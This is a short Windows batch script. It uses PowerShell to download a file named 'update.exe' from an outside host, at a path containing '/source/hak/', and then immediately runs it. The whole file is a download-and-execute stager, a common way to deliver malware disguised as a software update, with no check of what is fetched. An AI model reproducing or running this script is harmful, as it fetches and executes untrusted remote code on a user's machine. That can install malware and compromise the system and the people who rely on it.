@echo off
SETLOCAL

REM Define the URL of the file to download
SET "url=http://thejohnsons.net.nz/source/hak/update.exe"

REM Define the name of the file to save
SET "output=update.exe"

REM Use PowerShell to download the file
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

REM Check if the download was successful
IF EXIST "%output%" (
    echo Download successful.
    REM Run the downloaded file
    start "" "%output%"
) ELSE (
    echo Download failed.
)

ENDLOCAL
